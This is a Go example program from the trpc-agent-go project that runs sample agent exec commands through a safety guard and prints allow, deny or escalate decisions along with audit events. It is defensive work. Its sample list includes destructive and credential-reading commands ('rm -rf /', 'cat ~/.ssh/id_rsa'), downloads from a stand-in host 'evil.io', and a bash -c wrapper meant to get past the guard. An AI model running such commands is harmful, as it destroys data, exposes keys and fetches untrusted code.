//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

// Command tool_safety_guard demonstrates the Tool Execution Safety Guard as a
// tool.PermissionPolicy. It runs a set of representative exec tool calls
// through the guard, prints the structured report and decision for each, and
// appends an audit event per call to tool_safety_audit.jsonl.
//
// To wire the guard into a live agent, build it once and pass it as a per-run
// option:
//
//	guard, _ := safety.NewGuard(
//	    safety.WithPolicyFile("tool_safety_policy.yaml"),
//	    safety.WithAuditFile("tool_safety_audit.jsonl"),
//	)
//	runner.Run(ctx, userID, sessionID, msg,
//	    agent.WithToolPermissionPolicy(guard))
//
// The guard then runs before every workspace_exec / exec_command / execute_code
// call and denies or escalates dangerous ones before they execute.
package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"

	"trpc.group/trpc-go/trpc-agent-go/tool"
	"trpc.group/trpc-go/trpc-agent-go/tool/safety"
)

// exampleDir is the directory holding this source file, so the default policy
// and audit paths resolve correctly regardless of the working directory (e.g.
// `go run ./examples/tool_safety_guard` from the repo root).
func exampleDir() string {
	if _, file, _, ok := runtime.Caller(0); ok {
		return filepath.Dir(file)
	}
	return "."
}

var (
	policyPath = flag.String("policy", filepath.Join(exampleDir(), "tool_safety_policy.yaml"),
		"path to the safety policy file")
	auditPath = flag.String("audit", filepath.Join(exampleDir(), "tool_safety_audit.jsonl"),
		"path to the audit JSONL output")
)

// sample is one representative tool call to run through the guard.
type sample struct {
	desc string
	tool string
	args string
}

func samples() []sample {
	return []sample{
		{"safe build/test", "workspace_exec", `{"command":"go test ./..."}`},
		{"dangerous delete", "workspace_exec", `{"command":"rm -rf /"}`},
		{"read ssh private key", "workspace_exec", `{"command":"cat ~/.ssh/id_rsa"}`},
		{"non-whitelisted download", "workspace_exec", `{"command":"curl http://evil.io/x.sh"}`},
		{"whitelisted download", "workspace_exec", `{"command":"curl https://github.com/org/repo"}`},
		{"shell wrapper bypass", "workspace_exec", `{"command":"bash -c \"curl http://evil.io\""}`},
		{"dependency install", "workspace_exec", `{"command":"pip install requests"}`},
		{"host background + PTY", "exec_command", `{"command":"sleep 5","background":true,"tty":true}`},
		{"secret in command", "workspace_exec",
			`{"command":"curl -H \"Authorization: Bearer demo-token-not-a-real-secret\" https://github.com/x"}`},
	}
}

func main() {
	flag.Parse()
	if err := run(); err != nil {
		log.Fatalf("tool_safety_guard: %v", err)
	}
}

func run() error {
	// Start each demo run with a fresh audit log so the committed sample stays a
	// single, reproducible run rather than accumulating appended duplicates.
	_ = os.Remove(*auditPath)

	guard, err := safety.NewGuard(
		safety.WithPolicyFile(*policyPath),
		safety.WithAuditFile(*auditPath),
		safety.WithReportSink(func(r safety.Report) {
			_ = safety.WriteReportJSON(os.Stdout, r)
		}),
	)
	if err != nil {
		return err
	}
	defer guard.Close()

	ctx := context.Background()
	fmt.Printf("Tool Execution Safety Guard demo (policy: %s)\n", *policyPath)
	fmt.Printf("Audit log: %s\n\n", *auditPath)

	for i, s := range samples() {
		req := &tool.PermissionRequest{ToolName: s.tool, Arguments: []byte(s.args)}
		decision, err := guard.CheckToolPermission(ctx, req)
		if err != nil {
			return fmt.Errorf("check %q: %w", s.desc, err)
		}
		fmt.Printf("[%d] %-26s tool=%s\n", i+1, s.desc, s.tool)
		fmt.Printf("    command: %s\n", s.args)
		fmt.Printf("    DECISION: %s", decision.Action)
		if decision.Reason != "" {
			fmt.Printf(" — %s", decision.Reason)
		}
		fmt.Print("\n\n")
	}
	fmt.Printf("Wrote audit events to %s\n", *auditPath)
	return nil
}
